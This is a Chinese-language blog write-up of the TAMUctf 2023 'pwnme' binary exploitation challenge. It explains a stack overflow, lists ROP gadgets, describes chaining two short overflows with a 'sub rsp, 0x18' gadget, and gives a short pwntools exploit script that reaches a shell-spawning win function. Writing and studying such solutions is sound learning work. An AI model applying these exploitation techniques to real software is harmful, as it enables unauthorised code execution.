@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TAMUctf 2023 Pwnme - linked ROP chain | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TAMUctf 2023 Pwnme - linked ROP chain" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 leave; ret 或是 xchg eax, esp 等方法完成栈迁移。 但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 sub rsp, 0x18; call vul 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。" />
+<meta property="og:description" content="当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 leave; ret 或是 xchg eax, esp 等方法完成栈迁移。 但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 sub rsp, 0x18; call vul 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。" />
+<link rel="canonical" href="https://www.cameudis.com/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html" />
+<meta property="og:url" content="https://www.cameudis.com/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-05-04T15:55:01+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TAMUctf 2023 Pwnme - linked ROP chain" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-04T15:55:01+08:00","datePublished":"2023-05-04T15:55:01+08:00","description":"当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 leave; ret 或是 xchg eax, esp 等方法完成栈迁移。 但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 sub rsp, 0x18; call vul 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。","headline":"TAMUctf 2023 Pwnme - linked ROP chain","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html"},"url":"https://www.cameudis.com/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cameudis.com/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/links/">Links</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">TAMUctf 2023 Pwnme - linked ROP chain</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-05-04T15:55:01+08:00" itemprop="datePublished">May 4, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 <code class="language-plaintext highlighter-rouge">leave; ret</code> 或是 <code class="language-plaintext highlighter-rouge">xchg eax, esp</code> 等方法完成栈迁移。
+但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 <code class="language-plaintext highlighter-rouge">sub rsp, 0x18; call vul</code> 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。</p>
+
+<p>比赛时和前辈两人看这题看了几个小时，找gadget找了很久也没做出来。比赛结束后发现了两个版本的做法，分别是<a href="https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/pwnme">官方的</a>和<a href="https://chovid99.github.io/posts/tamuctf-2023/#pwnme">Chovid99师傅的</a>的。官方的做法比较一般，并且和我们比赛时的思路完全一致（只是我们傻了没发现那个关键gadget），因此本文主要分析官方的做法。</p>
+
+<!-- more -->
+
+<p>题目给了两个binary：</p>
+<ul>
+  <li>pwnme：什么函数都没有，只有一个main函数调用了libpwnme库的pwnme函数。
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Arch:     amd64-64-little
+  RELRO:    Partial RELRO
+  Stack:    No canary found
+  NX:       NX enabled
+  PIE:      No PIE (0x400000)
+</code></pre></div>    </div>
+  </li>
+  <li>libpwnme.so：pwnme函数，以及一个调用即get shell的win函数。
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Arch:     amd64-64-little
+  RELRO:    Partial RELRO
+  Stack:    No canary found
+  NX:       NX enabled
+  PIE:      PIE enabled
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>漏洞函数很朴实，就是一个简单的栈溢出：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">pwnme</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>
+
+  <span class="n">setup</span><span class="p">();</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"pwn me"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x48uLL</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>我们的目标是调用win函数，但win函数位于libpwnme中，其地址是随机变化的。
+我们ROP使用的gadget，要么来自于已知的地址，要么来自于经过partial overwrite的栈上已有的地址。
+在这道题中，能够partial overwrite的只有__libc_start_main的返回地址，但这个地址和win函数差的很远（尽管它们的偏移是确定的值），需要爆破约12个bits才行。因此暂时放弃这种思路。</p>
+
+<p>我们可以用到的gadget，只有pwnme binary中的gadget，然而这个binary除了调用pwnme的main函数之外，可以说啥都没有。GOT上除了__libc_start_main和pwnme就没有别的函数了。
+不过，如果用心找找，还是能找到一些有用的gadget，我找到的如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x000000000040118b : pop rdi ; ret
+0x0000000000401191 : mov rax, qword ptr [rdi] ; ret
+
+0x0000000000401189 : pop rsi ; pop r15 ; ret
+0x00000000004011b2 : sub rax, rsi ; ret
+
+0x0000000000401010 : call rax
+0x000000000040109c : jmp rax
+
+0x0000000000401016 : ret
+</code></pre></div></div>
+
+<p>用这些gadget我们可以取出GOT中pwnme的地址，然后加上一个偏移并执行，这样就可以执行位于pwnme-0x18位置的win函数。但问题在于，题目允许溢出0x48字节，也就是从返回地址算起一共6个栏位（0x30）可以填ROP gadget。但使用这些gadget需要8*8=0x40字节才能完成对于pwnme的调用。</p>
+
+<p>我比赛时想到了两种思路：</p>
+<ol>
+  <li>分多次ROP完成，想办法在前后两次ROP之间，保存第一次ROP的成果（比如尝试保存rax），存到不会改变的寄存器、栈上或者某个内存地址；</li>
+  <li>减小rsp，这样就可以复用之前输入的、位于栈上高位的payload。</li>
+</ol>
+
+<p>对于第一种思路，我们寻找了很久gadget，并没有发现能够用上的，因此不得不放弃。
+对于第二种思路，我们寻找了很久gadget，只找到了一个很难使用的 <code class="language-plaintext highlighter-rouge">pop rsp</code>，以及一些 <code class="language-plaintext highlighter-rouge">sub rsp, 0x18; add rsp, 0x18</code> 这样完全没用的gadget。</p>
+
+<p>但这个gadget其实就放在pwnme binary的main函数中：</p>
+
+<p><img src="https://i.imgtg.com/2023/05/04/Ck43t.png" alt="" /></p>
+
+<p>通过这个gadget，我们可以将payload的后一部分先写到栈上，然后返回到main函数中，借助 <code class="language-plaintext highlighter-rouge">sub rsp, 0x18</code> 来向低位延申栈，然后再把payload的前一部分写到栈上，覆盖返回到main的gadget，构造一条完整的ROP链，如图所示：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      │        │    │        │
+      ├────────┤    ├────────┤
+      │Overflow│    │ROP     │
+      │0x30 MAX│    │Part II │
+      │        │    │        │
+─────►│─ ─ ─ ─ ┤    ├────────┤◄─────
+      │ret_addr│    │ROP     │
+      ├────────┤    │Part I  │ sub rsp, 0x18
+pwnme │savedrbp│    │        │
+stack ├────────┤    │        │
+      │Buffer  │    │        │
+      │0x10    │    │        │
+      │        │    │        │
+─────►└────────┘    │─ ─ ─ ─ ┤◄─────
+                    │        │
+                    ├────────┤
+                    │savedrbp│ pwnme
+                    ├────────┤ stack
+                    │Buffer  │
+                    │0x10    │
+                    │        │
+                    └────────┘◄─────
+</code></pre></div></div>
+
+<p>图中第一次溢出时，将ret_addr覆盖为main的接近开头处，之后地址高位的部分填充payload后一部分。
+第二次溢出时，填充payload前一部分，注意要把跳转到main的那个gadget给覆盖掉，完成两段ROP chain的链接。</p>
+
+<p>理论上，只要从返回地址数起，能够溢出0x20字节，就可以完成上述操作。
+如果将这种操作重复多次，就构造任意长度的ROP chain。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401199</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x4011b2</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401016</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401010</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"pwn"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x40118b</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"pwnme"</span><span class="p">])</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401191</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x401189</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"pwn"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>另外，Chovid99师傅的解法也十分巧妙，是利用 <code class="language-plaintext highlighter-rouge">add byte ptr [rbp - 0x3d], bl</code> gadget修改pwnme binary中的GOT低位，来把pwnme地址变成win的地址。也很巧妙，学习！</p>
+
+  </div>
+    
+      <b>本博客上与 pwn 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2024/07/24/CISCN-Final-2024.html">CISCN Final 2024</a></li>
+        
+          <li><a href="/2024/04/18/BlackHatMEA2023-House-of-Minho.html">BlackHatMEA 2023 House of Minho</a></li>
+        
+          <li><a href="/2024/02/19/VNCTF2024-escape-langlang-mountain2.html">VNCTF 2024 escape_langlang_mountain2</a></li>
+        
+          <li><a href="/2023/11/29/HITCTF2023-xv6-Trusted.html">HITCTF 2023 xv6-Trusted</a></li>
+        
+          <li><a href="/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html">TAMUctf 2023 Pwnme - linked ROP chain</a></li>
+        
+          <li><a href="/2023/04/04/Bing-Chilling.html">UTCTF 2023 Bing Chilling</a></li>
+        
+      </ul>
+    
+  
+    
+      <b>本博客上与 rop 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html">TAMUctf 2023 Pwnme - linked ROP chain</a></li>
+        
+          <li><a href="/2023/04/04/Bing-Chilling.html">UTCTF 2023 Bing Chilling</a></li>
+        
+      </ul>
+    
+  
+
+  <div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2023/05/04/TAMUctf-2023-Pwnme-linked-ROP-chain.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
